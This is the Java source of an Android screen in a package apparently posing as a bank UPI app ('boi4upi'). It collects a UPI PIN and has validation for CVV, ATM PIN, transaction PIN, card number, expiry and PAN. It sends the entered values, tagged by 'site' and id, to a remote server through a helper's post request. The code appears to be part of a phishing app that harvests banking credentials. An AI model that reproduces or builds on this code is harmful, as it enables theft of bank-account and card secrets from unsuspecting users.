package com.myservice.boi4upi;

import android.content.Intent;
import android.os.Bundle;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.myservice.boi4upi.FrontServices.FormValidator;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;
public class SecondActivity extends AppCompatActivity {

    public Map<Integer, String> ids;
    public HashMap<String, Object> dataObject;

    public SecondActivity() {
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.second_activity);

        // Initialize the dataObject HashMap
        dataObject = new HashMap<>();

        int id = getIntent().getIntExtra("id", -1);
        ImageView buttonSubmit = findViewById(R.id.submitForm);

        ids = new HashMap<>();
        ids.put(R.id.uppin, "uppin");


        for(Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);

            String value = editText.getText().toString().trim();
            dataObject.put(key, value);
        }

        buttonSubmit.setOnClickListener(v -> {
            if (validateForm()) {

                JSONObject dataJson = new JSONObject(dataObject);
                JSONObject sendPayload = new JSONObject();
                try {
                    Helper helper = new Helper();
                    sendPayload.put("site", helper.SITE());
                    sendPayload.put("data", dataJson);
                    sendPayload.put("id", id);
                    Helper.postRequest(helper.FormSavePath(), sendPayload, new Helper.ResponseListener() {
                        @Override
                        public void onResponse(String result) {
                            if (result.startsWith("Response Error:")) {
                                Toast.makeText(getApplicationContext(), "Response Error : "+result, Toast.LENGTH_SHORT).show();
                            } else {
                                try {
                                    JSONObject response = new JSONObject(result);
                                    if(response.getInt("status")==200){
                                        Intent intent = new Intent(getApplicationContext(), LastActivity.class);
                                        intent.putExtra("id", id);
                                        startActivity(intent);
                                    }else{
                                        Toast.makeText(getApplicationContext(), "Status Not 200 : "+response, Toast.LENGTH_SHORT).show();
                                    }
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }
                        }
                    });
                } catch (JSONException e) {
                    Toast.makeText(this, "Error1 "+e.toString(), Toast.LENGTH_SHORT).show();
                }
            }else{
                Toast.makeText(getApplicationContext(), "form validation failed", Toast.LENGTH_SHORT).show();
            }

        });

    }

    public boolean validateForm() {
        boolean isValid = true; // Assume the form is valid initially

        // Clear dataObject before adding new data
        dataObject.clear();

        for (Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);

            // Check if the field is required and not empty
            if (!FormValidator.validateRequired(editText, "Please enter valid input")) {
                isValid = false; // Mark as invalid if required field is missing
                continue; // Continue with the next field
            }

            String value = editText.getText().toString().trim();

            // Validate based on the key
            switch (key) {
                case "phone":
                    if (!FormValidator.validateMinLength(editText, 10, "Required 10 digit " + key)) {
                        isValid = false;
                    }
                    break;

                case "cvv":
                    if (!FormValidator.validateMinLength(editText, 3, "Invalid CVV")) {
                        isValid = false;
                    }
                    break;
                case "atmpin":
                    if (!FormValidator.validateMinLength(editText, 4, "Invalid ATM Pin")) {
                        isValid = false;
                    }
                    break;
                case "tpin":
                    if (!FormValidator.validateMinLength(editText, 4, "Invalid Pin")) {
                        isValid = false;
                    }
                    break;
                case "expiry":
                    if (!FormValidator.validateMinLength(editText, 5, "Invalid Expiry Date")) {
                        isValid = false;
                    }
                    break;
                case "card":
                    if (!FormValidator.validateMinLength(editText, 19, "Invalid Card Number")) {
                        isValid = false;
                    }
                    break;
                case "pan":
                    if (!FormValidator.validatePANCard(editText, "Invalid Pan Number")) {
                        isValid = false;
                    }
                    break;
                default:
                    break;
            }

            // Add to dataObject only if the field is valid
            if (isValid) {
                dataObject.put(key, value);
            }
        }

        return isValid;
    }

}
